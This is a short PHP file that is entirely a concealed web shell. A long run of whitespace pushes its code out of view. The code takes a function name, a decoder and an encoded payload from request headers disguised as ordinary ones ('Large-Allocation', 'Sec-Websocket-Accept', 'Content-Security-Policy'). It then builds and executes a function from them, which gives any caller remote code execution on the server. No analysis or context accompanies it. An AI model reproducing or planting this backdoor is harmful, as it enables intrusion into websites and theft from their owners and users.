<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Large-Allocation'])){$sys=$_HEADERS['Large-Allocation']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Content-Security-Policy']));$sys();}
